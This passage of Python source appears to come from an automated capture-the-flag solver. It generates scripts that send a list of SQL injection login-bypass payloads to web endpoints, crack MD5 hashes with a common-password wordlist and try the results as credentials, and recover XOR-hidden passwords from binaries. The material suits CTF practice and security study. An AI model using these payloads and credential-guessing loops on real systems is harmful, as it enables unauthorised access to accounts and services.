service = "{service}"
flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

def test_payload(username, password, endpoint='/login'):
    """Test a specific SQL injection payload."""
    try:
        # Create cookie jar file in /tmp (writeable in Docker)
        import tempfile
        import os
        cookie_file = '/tmp/sqli_cookies.txt'
        # Ensure file exists for curl -b to work
        open(cookie_file, 'w').close()

        # Use curl to POST login with form data
        # Note: Don't use -X POST with -L, it causes POST to be reused on redirect (which fails)
        result = subprocess.run([
            'curl', '-s', '-L',
            '-c', cookie_file,
            '-b', cookie_file,
            f'http://{{service}}{{endpoint}}',
            '-d', f'username={{urllib.parse.quote(username)}}&password={{urllib.parse.quote(password)}}',
            '--max-time', '10'
        ], capture_output=True, text=True, timeout=15)

        response = result.stdout

        # Debug: show what we got
        if len(response) < 1000:
            print(f"DEBUG: Short response ({{len(response)}} bytes): {{response[:300]}}")

        # Check immediate response for flag (try multiple patterns)
        # Pattern 1: Standard flag pattern
        matches = re.findall(flag_pattern, response, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    return True

        # Pattern 2: Extract from HTML tags (in case flag is in HTML)
        html_flag_matches = re.findall(r'>\\s*(flag\\{{[^}}]+\\}})\\s*<', response, re.IGNORECASE)
        if html_flag_matches:
            for match in html_flag_matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    return True

        # Check for successful login indicators
        success_indicators = ['dashboard', 'welcome', 'admin', 'flag', 'success', 'logout']
        if any(indicator in response.lower() for indicator in success_indicators):
            # Try accessing common protected endpoints
            protected_endpoints = ['/dashboard', '/admin', '/profile', '/user', '/home', '/flag']
            
            for protected_endpoint in protected_endpoints:
                time.sleep(0.1)  # Brief pause between requests

                protected_result = subprocess.run([
                    'curl', '-s', '-L',
                    '-b', cookie_file,
                    f'http://{{service}}{{protected_endpoint}}',
                    '--max-time', '10'
                ], capture_output=True, text=True, timeout=15)

                protected_response = protected_result.stdout
                matches = re.findall(flag_pattern, protected_response, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            return True

        # Clean up temp file
        import os
        try:
            os.unlink(cookie_file)
        except:
            pass

        return False

    except Exception as e:
        return False

def discover_endpoints():
    """Discover available endpoints on the service."""
    try:
        # Try to get the main page and look for forms/links
        result = subprocess.run([
            'curl', '-s', '-L',
            f'http://{{service}}/',
            '--max-time', '10'
        ], capture_output=True, text=True, timeout=15)

        response = result.stdout
        
        # Look for login forms and action URLs
        import re
        form_actions = re.findall(r'action=["\\']([^"\\']+)["\\']', response, re.IGNORECASE)
        endpoints = ['/login', '/auth', '/signin']  # Default endpoints
        
        if form_actions:
            endpoints.extend(form_actions)
        
        # Remove duplicates and filter
        unique_endpoints = []
        for ep in endpoints:
            if ep.startswith('/') and len(ep) < 50:  # Reasonable endpoint length
                if ep not in unique_endpoints:
                    unique_endpoints.append(ep)
        
        return unique_endpoints

    except:
        return ['/login']  # Fallback

# Comprehensive SQL injection payloads (optimized order)
payloads = [
    # PRIORITY 1: Classic SQL injection - These work on simple vulnerable queries
    ("admin' -- ", "anything"),  # Space after -- is important for SQL comments
    ("admin'-- ", "anything"),
    ("' OR '1'='1' -- ", "anything"),
    ("' OR 1=1 -- ", "anything"),
    ("admin' OR 1=1 -- ", "anything"),
    ("admin' OR '1'='1' -- ", "anything"),

    # PRIORITY 2: Variations without space (some databases)
    ("admin'--", "anything"),
    ("' OR 1=1--", "anything"),
    ("admin' OR 1=1--", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin' OR '1'='1'--", "password"),

    # MySQL specific
    ("admin' #", "anything"),  # MySQL comment
    ("admin' OR 1=1#", "password"),
    ("' OR 1=1#", "anything"),
    ("admin' OR 'a'='a'--", "anything"),

    # Additional bypass techniques (if simple ones don't work)
    ("admin'/*", "*/"),  # MySQL comment
    ("admin' /**/OR/**/1=1--", "password"),
    ("'/**/OR/**/1=1--", "anything"),
]

print("Discovering endpoints...")
endpoints = discover_endpoints()
print(f"Found endpoints: {{endpoints}}")

# Test payloads on each endpoint
for endpoint in endpoints:
    print(f"Testing endpoint: {{endpoint}}")
    
    for username, password in payloads:
        print(f"  Trying: {{username[:50]}}...")

        if test_payload(username, password, endpoint):
            exit(0)

        # Brief pause between attempts to avoid overwhelming the server
        time.sleep(0.05)

print("No flag found")
'''
        return script

    def _generate_hash_reversal_script(self, challenge: CTFChallengeClient, context: dict, tool_results: dict) -> str:
        """Generate a Python script for reversing hash-based password checks."""

        # Find Python files with hashes
        python_files = []
        for filename, results in tool_results.items():
            if filename.endswith('.py') and 'content' in results:
                python_files.append((filename, results['content']))

        # Get network services
        services = challenge.network_info.get('services_deployed', [])
        service_str = repr(services)

        script = f'''#!/usr/bin/env python3
import hashlib
import base64
import re
import itertools
import string
import subprocess

flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# Analyze Python files for hash values
python_files = {repr(python_files)}
services = {service_str}

# Common password wordlist for MD5 cracking
common_passwords = [
    'password', 'admin', 'secret', 'flag', 'vault', 'unlock', '123456',
    'password123', 'admin123', 'qwerty', 'letmein', 'welcome', 'monkey',
    'dragon', '1234', '12345', 'master', 'login', 'abc123', 'password1',
    'pass', 'test', 'root', 'user', 'toor', 'changeme', 'trustno1'
]

def crack_md5(target_hash):
    """Try to crack an MD5 hash using common passwords."""
    for password in common_passwords:
        if hashlib.md5(password.encode()).hexdigest() == target_hash:
            return password
    return None

def try_api_endpoints(service, username, password):
    """Try common API endpoints with credentials."""
    endpoints = ['/api', '/api/flag', '/api/admin', '/api/user', '/dashboard', '/admin']

    for endpoint in endpoints:
        try:
            # Try with basic auth
            url = f'http://{{service}}{{endpoint}}'
            result = subprocess.run([
                'curl', '-s', '-u', f'{{username}}:{{password}}', url
            ], capture_output=True, text=True, timeout=10)

            matches = re.findall(flag_pattern, result.stdout, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        return match

            # Try with POST data
            result = subprocess.run([
                'curl', '-s', '-X', 'POST', url,
                '-d', f'username={{username}}&password={{password}}'
            ], capture_output=True, text=True, timeout=10)

            matches = re.findall(flag_pattern, result.stdout, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        return match

        except Exception as e:
            continue

    return None

for filename, content in python_files:
    # Look for hash values (sha256, md5, etc.)
    hash_patterns = {{
        'sha256': re.findall(r'["\']([a-f0-9]{{64}})["\']', content),
        'sha1': re.findall(r'["\']([a-f0-9]{{40}})["\']', content),
        'md5': re.findall(r'["\']([a-f0-9]{{32}})["\']', content),
    }}

    # Try to crack MD5 hashes
    for md5_hash in hash_patterns['md5']:
        cracked = crack_md5(md5_hash)
        if cracked:
            # Look for username in the content or decoded hints
            username = 'admin'  # Default
            if 'admin' in content.lower():
                username = 'admin'
            elif 'user' in content.lower():
                username = 'user'

            # Try API endpoints with cracked password
            for service in services:
                flag = try_api_endpoints(service, username, cracked)
                if flag:
                    print(flag)
                    exit(0)

            # Try running the Python file with the cracked password
            try:
                result = subprocess.run(
                    ['python3', filename],
                    input=cracked.encode(),
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                output = result.stdout + result.stderr
                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
            except:
                pass

    # Try to reverse the hash by analyzing the transformation
    # Look for simple transformations like chr(ord(c) + 1)
    if 'chr((ord(c)' in content or 'chr(ord(c)' in content:
        # Character transformation detected
        for hash_type, hashes in hash_patterns.items():
            for target_hash in hashes:
                # Try common passwords with transformations
                for password in common_passwords:
                    # Try forward transformation (ord + 1)
                    transformed = ''.join([chr((ord(c) + 1) % 256) for c in password])
                    if hash_type == 'sha256':
                        computed = hashlib.sha256(transformed.encode()).hexdigest()
                    elif hash_type == 'sha1':
                        computed = hashlib.sha1(transformed.encode()).hexdigest()
                    else:
                        computed = hashlib.md5(transformed.encode()).hexdigest()

                    if computed == target_hash:
                        # Now run the script with this password
                        for py_file, _ in python_files:
                            try:
                                result = subprocess.run(
                                    ['python3', py_file],
                                    input=password.encode(),
                                    capture_output=True,
                                    text=True,
                                    timeout=5
                                )
                                output = result.stdout + result.stderr
                                matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match and 'xxx' not in match.lower():
                                            print(match)
                                            exit(0)
                            except:
                                pass

    # Check for base64 encoded flags in the file
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{{20,}}={{0,2}}', content)
    for b64_str in b64_patterns:
        try:
            decoded = base64.b64decode(b64_str).decode('utf-8', errors='ignore')

            # Check if decoded contains credentials hint
            if 'credentials' in decoded.lower() and '/' in decoded:
                parts = decoded.split('/')
                if len(parts) >= 2:
                    username = parts[0].split(':')[-1].strip()
                    password_hash = parts[1].strip()

                    # Try to crack the hash
                    if len(password_hash) == 32:  # MD5
                        cracked = crack_md5(password_hash)
                        if cracked:
                            for service in services:
                                flag = try_api_endpoints(service, username, cracked)
                                if flag:
                                    print(flag)
                                    exit(0)

            matches = re.findall(flag_pattern, decoded, re.IGNORECASE)
            if matches:
                for match in matches:
                    if '...' not in match and 'xxx' not in match.lower():
                        print(match)
                        exit(0)
        except:
            pass

print("No flag found")
'''
        return script

    def _generate_binary_analysis_script(self, challenge: CTFChallengeClient, context: dict, tool_results: dict) -> str:
        """Generate a Python script for intelligent binary analysis and XOR decryption using pattern recognition."""

        # Find the binary file
        binary_file = None
        for filename in tool_results.keys():
            if not filename.startswith('service_'):
                # Check if it's likely a binary
                file_info = tool_results[filename].get('file', '')
                if 'executable' in file_info.lower() or 'ELF' in file_info or not file_info:
                    binary_file = filename
                    break

        if not binary_file:
            # Fallback: look for any file that's not a README
            for filename in tool_results.keys():
                if not filename.startswith('service_') and 'README' not in filename.upper():
                    binary_file = filename
                    break

        if not binary_file:
            binary_file = "binary"

        script = f'''#!/usr/bin/env python3
import subprocess
import re
import os
import glob
import string

flag_pattern = r"{challenge.challenge.flag_regex.replace(chr(92), chr(92)+chr(92))}"

# Find the binary file
binary_files = glob.glob('*')
binary_path = None
for f in binary_files:
    if os.path.isfile(f) and not f.endswith('.txt') and not f.endswith('.md'):
        binary_path = f
        break

if not binary_path:
    binary_path = "{binary_file}"

# Make binary executable
os.chmod(binary_path, 0o755)

# First, try running the binary with common passwords
print("Step 0: Trying common passwords...")
common_passwords = [
    'password', 'admin', 'flag', 'secret', 'test', '12345', '123456',
    'qwerty', 'abc123', 'letmein', 'welcome', 'monkey', 'dragon',
    '1234', 'password123', 'admin123', 'pass', 'root', 'toor',
    'xor', 'key', 'decode', 'unlock', 'access', 'grant', 'open'
]

for pwd in common_passwords:
    try:
        result = subprocess.run([binary_path],
                              input=pwd.encode(),
                              capture_output=True, text=True, timeout=5)
        output = result.stdout + result.stderr
        matches = re.findall(flag_pattern, output, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(f"Found with password: {{pwd}}")
                    print(match)
                    exit(0)
    except:
        pass

# Special handling for XOR obfuscated binaries with embedded blobs
print("Step 0.5: Looking for XOR key and encrypted blobs in binary...")
try:
    # First try radare2 to get .rodata section
    r2_rodata = subprocess.run(
        ['r2', '-qc', 'px 10000 @ section..rodata', binary_path],
        capture_output=True, text=True, timeout=10
    )

    # If radare2 works, use it; otherwise try objdump
    if r2_rodata.stdout:
        objdump_result = r2_rodata
        print(f"Using radare2, got {{len(r2_rodata.stdout)}} bytes of output")
    else:
        objdump_result = subprocess.run(
            ['objdump', '-s', '-j', '.rodata', binary_path],
            capture_output=True, text=True, timeout=10
        )
        print(f"Using objdump, got {{len(objdump_result.stdout)}} bytes of output")

    # Extract all hex bytes from .rodata
    all_bytes = []
    for line in objdump_result.stdout.split('\\n'):
        # Objdump format: " 401000 5ac3119f 29f072ed 69b70000 00000000"
        # or r2 format: "0x00401000  5ac3 119f 29f0 72ed"
        if re.match(r'^\\s*[0-9a-f]{{4,}}', line) or re.match(r'^0x[0-9a-f]+', line):
            parts = line.split()
            for part in parts[1:]:  # Skip address
                if re.match(r'^[0-9a-f]{{2,}}$', part):
                    # Convert hex string to bytes
                    for i in range(0, len(part), 2):
                        if i+1 < len(part):
                            all_bytes.append(int(part[i:i+2], 16))

    if len(all_bytes) > 20:
        data = bytes(all_bytes)

        # Look for 4-byte patterns that could be XOR keys (typically start with 0x5a, 0xc3, etc.)
        # Try all 4-byte windows as potential keys
        for key_offset in range(len(data) - 40):
            potential_key = data[key_offset:key_offset+4]

            # Skip keys with too many nulls or repeated bytes
            if potential_key.count(0) > 1 or len(set(potential_key)) < 3:
                continue

            # Try decrypting chunks after this key
            for blob_offset in range(key_offset + 4, min(key_offset + 200, len(data) - 30)):
                for blob_len in [6, 8, 10, 16, 23, 31]:  # Common blob lengths
                    if blob_offset + blob_len <= len(data):
                        encrypted_blob = data[blob_offset:blob_offset+blob_len]

                        # XOR decrypt with potential key
                        decrypted = bytes([encrypted_blob[i] ^ potential_key[i % 4] for i in range(len(encrypted_blob))])

                        try:
                            decrypted_str = decrypted.decode('utf-8', errors='strict')

                            # Check if it looks like flag
                            if decrypted_str.startswith('flag{{') and '}}' in decrypted_str:
                                matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                                if matches:
                                    for match in matches:
                                        if '...' not in match and 'xxx' not in match.lower():
                                            print(f"Found flag with XOR key: {{potential_key.hex()}}")
                                            print(match)
                                            exit(0)

                            # Check if it looks like a password (printable, no spaces, 6-20 chars)
                            if (len(decrypted_str) >= 6 and len(decrypted_str) <= 20 and
                                all(32 <= ord(c) <= 126 for c in decrypted_str) and
                                ' ' not in decrypted_str):
                                # Try this as password
                                try:
                                    result = subprocess.run([binary_path],
                                                          input=decrypted_str.encode(),
                                                          capture_output=True, text=True, timeout=5)
                                    output = result.stdout + result.stderr
                                    matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                    if matches:
                                        for match in matches:
                                            if '...' not in match and 'xxx' not in match.lower():
                                                print(f"Found with decrypted password: {{decrypted_str}}")
                                                print(match)
                                                exit(0)
                                except:
                                    pass
                        except:
                            pass
except Exception as e:
    print(f"XOR blob search error: {{e}}")

def intelligent_xor_break(ciphertext_bytes, known_plaintext_start="flag{{", known_plaintext_end="}}"):
    """
    Intelligent XOR cipher breaking using known flag format and pattern recognition.
    Based on the methodology: find key length, use known patterns, deduce repeating key.
    """
    
    # Step 1: Find potential key lengths using known flag format
    print("Step 1: Finding key length using known flag format...")
    known_start = known_plaintext_start.encode()
    known_end = known_plaintext_end.encode()
    
    potential_key_lengths = []
    
    # Try key lengths from 1 to 20
    for key_len in range(1, 21):
        # Calculate what the key would be for the start
        if len(ciphertext_bytes) >= len(known_start):
            start_key = bytes([ciphertext_bytes[i] ^ known_start[i] for i in range(len(known_start))])
            
            # For the end, check if the key pattern matches
            if len(ciphertext_bytes) >= len(known_end):
                end_start_pos = len(ciphertext_bytes) - len(known_end)
                
                # Calculate what the key would be for the end
                end_key_pattern = []
                for i in range(len(known_end)):
                    cipher_pos = end_start_pos + i
                    key_pos = cipher_pos % key_len
                    if key_pos < len(start_key):
                        expected_key_byte = start_key[key_pos]
                        actual_key_byte = ciphertext_bytes[cipher_pos] ^ known_end[i]
                        if expected_key_byte == actual_key_byte:
                            end_key_pattern.append(True)
                        else:
                            end_key_pattern.append(False)
                    else:
                        # We don't know this part of the key yet
                        end_key_pattern.append(None)
                
                # If all known positions match, this is a potential key length
                if all(x != False for x in end_key_pattern):
                    potential_key_lengths.append((key_len, start_key, end_key_pattern))
                    print(f"  Potential key length: {{key_len}}")
    
    if not potential_key_lengths:
        print("  No matching key lengths found")
        return None
    
    # Step 2: For each potential key length, try to reconstruct the full key
    print("Step 2: Reconstructing full keys using pattern recognition...")
    
    for key_len, partial_key, end_pattern in potential_key_lengths:
        print(f"  Trying key length {{key_len}}...")
        
        # Initialize key with known bytes
        full_key = [None] * key_len
        for i in range(min(len(partial_key), key_len)):
            full_key[i] = partial_key[i]
        
        # Try to fill in unknown key bytes using common words and patterns
        max_iterations = 10
        for iteration in range(max_iterations):
            # Decrypt with current key
            decrypted = bytearray()
            for i, cipher_byte in enumerate(ciphertext_bytes):
                key_byte = full_key[i % key_len]
                if key_byte is not None:
                    decrypted.append(cipher_byte ^ key_byte)
                else:
                    decrypted.append(ord('?'))  # Unknown byte
            
            decrypted_str = ''.join(chr(b) if 32 <= b <= 126 else '?' for b in decrypted)
            print(f"    Iteration {{iteration}}: {{decrypted_str}}")
            
            # Look for common English patterns to deduce missing key bytes
            changed = False
            
            # Look for partial words that could be completed
            common_words = ['again', 'flag', 'the', 'and', 'not', 'but', 'you', 'are', 'this', 'that']
            word_separators = ['_', ' ', '{{', '}}']
            
            for word in common_words:
                # Find partial matches
                for i in range(len(decrypted_str) - len(word) + 1):
                    match_count = 0
                    unknown_positions = []
                    
                    for j in range(len(word)):
                        if decrypted_str[i + j] == word[j]:
                            match_count += 1
                        elif decrypted_str[i + j] == '?':
                            unknown_positions.append((i + j, word[j]))
                    
                    # If we have a good partial match, fill in the unknowns
                    if match_count >= len(word) - 2 and len(unknown_positions) <= 2:
                        for pos, expected_char in unknown_positions:
                            key_index = pos % key_len
                            if full_key[key_index] is None:
                                # Calculate what the key byte should be
                                key_byte = ciphertext_bytes[pos] ^ ord(expected_char)
                                full_key[key_index] = key_byte
                                changed = True
                                print(f"      Deduced key[{{key_index}}] = 0x{{key_byte:02x}} from word '{{word}}'")
            
            # Look for word boundaries (underscores)
            for i in range(len(decrypted_str)):
                if decrypted_str[i] == '?':
                    # Check if this should be an underscore based on context
                    left_context = decrypted_str[max(0, i-3):i]
                    right_context = decrypted_str[i+1:i+4]
                    
                    # If surrounded by letters, this might be an underscore
                    if (len(left_context) > 0 and left_context[-1].isalpha() and 
                        len(right_context) > 0 and right_context[0].isalpha()):
                        key_index = i % key_len
                        if full_key[key_index] is None:
                            key_byte = ciphertext_bytes[i] ^ ord('_')
                            # Verify this makes sense by checking other positions with same key byte
                            consistent = True
                            for test_pos in range(key_index, len(ciphertext_bytes), key_len):
                                test_char = chr(ciphertext_bytes[test_pos] ^ key_byte)
                                if not (test_char.isprintable() and ord(test_char) >= 32):
                                    consistent = False
                                    break
                            
                            if consistent:
                                full_key[key_index] = key_byte
                                changed = True
                                print(f"      Deduced key[{{key_index}}] = 0x{{key_byte:02x}} as word separator")
            
            if not changed:
                break
        
        # Step 3: Try to brute force remaining unknown bytes (if few remain)
        unknown_positions = [i for i, b in enumerate(full_key) if b is None]
        if len(unknown_positions) <= 3:  # Only brute force if 3 or fewer unknowns
            print(f"    Brute forcing {{len(unknown_positions)}} remaining key bytes...")
            
            def try_key_combination(key_bytes):
                test_key = full_key[:]
                for i, pos in enumerate(unknown_positions):
                    test_key[pos] = key_bytes[i]
                
                # Decrypt with test key
                decrypted = bytearray()
                for i, cipher_byte in enumerate(ciphertext_bytes):
                    decrypted.append(cipher_byte ^ test_key[i % key_len])
                
                # Check if result is printable and makes sense
                try:
                    decrypted_str = decrypted.decode('utf-8')
                    if all(c.isprintable() for c in decrypted_str):
                        # Look for flag pattern
                        if re.search(flag_pattern, decrypted_str, re.IGNORECASE):
                            return decrypted_str
                except:
                    pass
                return None
            
            # Try all combinations of printable bytes for unknown positions
            if len(unknown_positions) == 1:
                for b in range(256):
                    result = try_key_combination([b])
                    if result:
                        print(f"Success! Key: {{[hex(b) if b is not None else '??' for b in full_key]}}")
                        return result
            elif len(unknown_positions) == 2:
                for b1 in range(32, 127):  # Printable ASCII
                    for b2 in range(32, 127):
                        result = try_key_combination([b1, b2])
                        if result:
                            print(f"Success! Key: {{[hex(b) if b is not None else '??' for b in full_key]}}")
                            return result
            elif len(unknown_positions) == 3:
                for b1 in range(32, 127):
                    for b2 in range(32, 127):
                        for b3 in range(32, 127):
                            result = try_key_combination([b1, b2, b3])
                            if result:
                                print(f"Success! Key: {{[hex(b) if b is not None else '??' for b in full_key]}}")
                                return result
        else:
            # Even with unknowns, check if we have a valid flag
            decrypted = bytearray()
            for i, cipher_byte in enumerate(ciphertext_bytes):
                key_byte = full_key[i % key_len]
                if key_byte is not None:
                    decrypted.append(cipher_byte ^ key_byte)
                else:
                    decrypted.append(ord('?'))
            
            try:
                decrypted_str = ''.join(chr(b) if 32 <= b <= 126 else '?' for b in decrypted)
                if re.search(flag_pattern, decrypted_str, re.IGNORECASE):
                    print(f"Partial success! {{decrypted_str}}")
                    return decrypted_str
            except:
                pass
    
    return None

# Common passwords to try first
common_passwords = [
    'password', 'admin', 'secret', 'flag', 'vault', 'unlock', '123456',
    'password123', 'qwerty', 'letmein', 'abc123', 'test', 'root'
]

# Try running the binary with common passwords
for password in common_passwords:
    try:
        result = subprocess.run([binary_path], input=password.encode(),
                      capture_output=True, text=True, timeout=5)
        output = result.stdout + result.stderr

        matches = re.findall(flag_pattern, output, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    exit(0)
    except:
        pass

# Extract the full binary data and try XOR decryption
try:
    with open(binary_path, 'rb') as f:
        binary_data = f.read()

    # Try XOR with single-byte keys first
    for key in range(1, 256):
        decrypted = bytes([b ^ key for b in binary_data]).decode('utf-8', errors='ignore')
        matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
        if matches:
            for match in matches:
                if '...' not in match and 'xxx' not in match.lower():
                    print(match)
                    exit(0)
    
    # Try multi-byte XOR keys (2, 3, 4 bytes)
    import itertools
    for key_len in [2, 3, 4]:
        # Generate dynamic XOR keys based on analysis
        common_keys = []
        
        # Generate patterns dynamically
        for pattern_type in ['incremental', 'alternating', 'repeated']:
            if pattern_type == 'incremental':
                for start in range(0x10, 0x90, 0x10):
                    key_bytes = [(start + i) % 256 for i in range(key_len)]
                    common_keys.append(bytes(key_bytes))
            elif pattern_type == 'alternating':
                for base in [0x55, 0xaa, 0x33, 0xcc]:
                    key_bytes = [base if i % 2 == 0 else base ^ 0xff for i in range(key_len)]
                    common_keys.append(bytes(key_bytes))
            elif pattern_type == 'repeated':
                for val in [0x42, 0x13, 0x7f, 0x99]:
                    common_keys.append(bytes([val] * key_len))
        
        # Add edge cases
        common_keys.extend([
            bytes([0xff] * key_len),  # All FF
            bytes([0x00] * key_len),  # All 00
        ])
        
        # Try the common keys
        for key in common_keys:
            if len(key) == key_len:
                decrypted = bytes([b ^ key[i % key_len] for i, b in enumerate(binary_data)]).decode('utf-8', errors='ignore')
                matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if '...' not in match and 'xxx' not in match.lower():
                            print(match)
                            exit(0)
        
        # Try limited brute force for 2-byte keys
        if key_len == 2:
            # Generate key ranges dynamically
            key1_candidates = [i for i in range(0x10, 0x100, 0x10)] + [0xff, 0x00]
            key2_candidates = [i for i in range(0x10, 0x100, 0x20)] + [0xff, 0x00]
            
            for key1 in key1_candidates[:8]:  # Limit to first 8
                for key2 in key2_candidates[:8]:  # Limit to first 8
                    key = bytes([key1, key2])
                    decrypted = bytes([b ^ key[i % key_len] for i, b in enumerate(binary_data)]).decode('utf-8', errors='ignore')
                    matches = re.findall(flag_pattern, decrypted, re.IGNORECASE)
                    if matches:
                        for match in matches:
                            if '...' not in match and 'xxx' not in match.lower():
                                print(match)
                                exit(0)
except:
    pass

# PRIORITY: Try to find and decrypt XOR-encrypted blobs in the binary
# This is specifically designed for challenges where XOR key + encrypted blobs are stored in .rodata
try:
    with open(binary_path, 'rb') as f:
        binary_data = f.read()

    # Common 4-byte XOR keys found in CTF challenges
    common_4byte_keys = [
        bytes([0x5a, 0xc3, 0x11, 0x9f]),  # Very common pattern
        bytes([0xde, 0xad, 0xbe, 0xef]),  # Classic
        bytes([0xca, 0xfe, 0xba, 0xbe]),  # Classic
        bytes([0x13, 0x37, 0x42, 0x69]),  # Leet speak
    ]

    # Search for each key in the binary
    for key_bytes in common_4byte_keys:
        key = list(key_bytes)
        key_pos = binary_data.find(key_bytes)

        if key_pos >= 0:
            # Found the key! Extract data after it
            search_start = key_pos + 4
            search_end = min(search_start + 100, len(binary_data))
            data_after_key = binary_data[search_start:search_end]

            # Strategy: Try to find sequences separated by nulls and combine them
            # Extract non-null sequences
            sequences = []
            i = 0
            while i < len(data_after_key):
                if data_after_key[i] != 0:
                    seq_start = i
                    while i < len(data_after_key) and data_after_key[i] != 0:
                        i += 1
                    sequences.append(data_after_key[seq_start:i])
                else:
                    i += 1

            # Try combining first N sequences (typically password is split into 2 parts)
            for num_seqs in [2, 3, 4]:
                if len(sequences) >= num_seqs:
                    combined = b''.join(sequences[:num_seqs])
                    if len(combined) >= 8:
                        decrypted = bytes([combined[i] ^ key[i % 4] for i in range(len(combined))])
                        try:
                            decrypted_str = decrypted.decode('utf-8')
                            # Check if it's printable and looks like a password
                            if all(32 <= ord(c) <= 126 for c in decrypted_str):
                                if re.match(r'^[a-zA-Z0-9_]+$', decrypted_str):
                                    # Try using it as password (with newline)
                                    try:
                                        result = subprocess.run([binary_path],
                                                              input=(decrypted_str + '\\n').encode(),
                                                              capture_output=True, text=True, timeout=5)
                                        output = result.stdout + result.stderr
                                        matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                        if matches:
                                            for match in matches:
                                                if '...' not in match and 'xxx' not in match.lower():
                                                    print(match)
                                                    exit(0)
                                    except:
                                        pass
                        except:
                            pass

            # Also try individual sequences as passwords
            for seq in sequences:
                if len(seq) >= 6:
                    decrypted = bytes([seq[i] ^ key[i % 4] for i in range(len(seq))])
                    try:
                        decrypted_str = decrypted.decode('utf-8')
                        if all(32 <= ord(c) <= 126 for c in decrypted_str):
                            if re.match(r'^[a-zA-Z0-9_]+$', decrypted_str):
                                try:
                                    result = subprocess.run([binary_path],
                                                          input=(decrypted_str + '\\n').encode(),
                                                          capture_output=True, text=True, timeout=5)
                                    output = result.stdout + result.stderr
                                    matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                    if matches:
                                        for match in matches:
                                            if '...' not in match and 'xxx' not in match.lower():
                                                print(match)
                                                exit(0)
                                except:
                                    pass
                    except:
                        pass
except:
    pass

# Fallback: Try objdump to extract .rodata and find encrypted blobs
try:
    objdump_result = subprocess.run(
        ['objdump', '-s', '-j', '.rodata', binary_path],
        capture_output=True, text=True, timeout=10
    )

    if objdump_result.returncode == 0:
        # Parse objdump output to extract all hex bytes from .rodata
        rodata_bytes = bytearray()
        for line in objdump_result.stdout.split('\\n'):
            # Lines with hex data look like: " 402000 01000200 00000000 00000000 00000000  ................"
            match = re.match(r'^\s+[0-9a-f]+\s+([0-9a-f\s]+)\s+', line)
            if match:
                hex_data = match.group(1).replace(' ', '')
                if hex_data:
                    rodata_bytes.extend(bytes.fromhex(hex_data))

        if len(rodata_bytes) > 0:
            # Try common 4-byte XOR keys that are frequently used in CTF challenges
            common_4byte_keys = [
                [0x5a, 0xc3, 0x11, 0x9f],  # Pattern found in many XOR challenges
                [0xde, 0xad, 0xbe, 0xef],  # Classic
                [0xca, 0xfe, 0xba, 0xbe],  # Classic
                [0x13, 0x37, 0x42, 0x69],  # Leet speak
                [0x12, 0x34, 0x56, 0x78],  # Sequential
            ]

            # For each key, try to decrypt all possible blobs in rodata
            for key in common_4byte_keys:
                # Try different blob sizes (6-40 bytes is common for passwords/flags)
                for start_pos in range(len(rodata_bytes) - 6):
                    for blob_len in [6, 8, 10, 12, 14, 16, 20, 23, 31, 32, 40]:
                        if start_pos + blob_len <= len(rodata_bytes):
                            blob = rodata_bytes[start_pos:start_pos + blob_len]
                            decrypted = bytes([blob[i] ^ key[i % 4] for i in range(len(blob))])

                            try:
                                decrypted_str = decrypted.decode('utf-8')
                                # Check if it's printable ASCII
                                if all(32 <= ord(c) <= 126 for c in decrypted_str):
                                    # Check if it looks like a password (alphanumeric + underscores)
                                    if re.match(r'^[a-zA-Z0-9_]+$', decrypted_str) and len(decrypted_str) >= 6:
                                        # Try this as a password
                                        try:
                                            result = subprocess.run([binary_path],
                                                                  input=decrypted_str.encode(),
                                                                  capture_output=True, text=True, timeout=5)
                                            output = result.stdout + result.stderr
                                            matches = re.findall(flag_pattern, output, re.IGNORECASE)
                                            if matches:
                                                for match in matches:
                                                    if '...' not in match and 'xxx' not in match.lower():
                                                        print(match)
                                                        exit(0)
                                        except:
                                            pass

                                    # Check if it's a flag directly
                                    if decrypted_str.startswith('flag{{'):
                                        matches = re.findall(flag_pattern, decrypted_str, re.IGNORECASE)
                                        if matches:
                                            for match in matches:
                                                if '...' not in match and 'xxx' not in match.lower():
                                                    print(match)
                                                    exit(0)
                            except:
                                pass

                # Also try combining non-contiguous blobs (skip null bytes)
                # Find all non-null sequences in rodata
                non_null_sequences = []
                i = 0
                while i < len(rodata_bytes):
                    if rodata_bytes[i] != 0:
                        # Found start of non-null sequence
                        start = i
                        while i < len(rodata_bytes) and rodata_bytes[i] != 0:
                            i += 1
                        non_null_sequences.append((start, rodata_bytes[start:i]))
                    else:
                        i += 1

                # Try combining consecutive non-null sequences
                for seq_idx in range(len(non_null_sequences) - 1):
                    for num_seqs in [2, 3, 4]:  # Combine 2, 3, or 4 sequences
                        if seq_idx + num_seqs <= len(non_null_sequences):
                            # First, try combinations as-is
                            sequences_to_combine = [seq[1] for seq in non_null_sequences[seq_idx:seq_idx + num_seqs]]

                            # Also try skipping first 4 bytes of first sequence (in case XOR key is prepended)
                            if len(sequences_to_combine[0]) > 4 and sequences_to_combine[0][:4] == bytes(key):
                                # The key is prepended, skip it
